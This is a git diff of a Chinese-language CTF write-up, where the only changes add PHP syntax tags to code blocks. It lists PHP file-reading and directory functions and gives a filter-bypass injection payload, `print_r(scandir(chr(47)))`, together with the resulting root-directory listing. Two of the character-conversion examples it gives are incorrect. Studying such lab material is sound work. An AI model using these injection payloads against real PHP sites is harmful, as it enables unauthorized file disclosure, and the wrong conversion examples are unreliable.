@@ -16,7 +16,7 @@ categories:
 
 php内置读取文件内容函数
 
-```
+```php
 file_get_contents()
 readfile()
 file()
@@ -24,7 +24,7 @@ file()
 
 目录扫描函数
 
-```
+```php
 scandir()
 ```
 
@@ -32,14 +32,14 @@ scandir()
 
 字符转换函数
 
-```
+```php
 hex2bin("979797")->"aaa"
 chr(95)->"a"
 ```
 
 输出函数
 
-```
+```php
 var_dump()
 printf()
 ```
@@ -96,7 +96,7 @@ if(!isset($_GET['num'])){
 
 扫描目录使用`scandir()`因为`/ '  "`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`
 
-```
+```php
 Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1
 ```
 
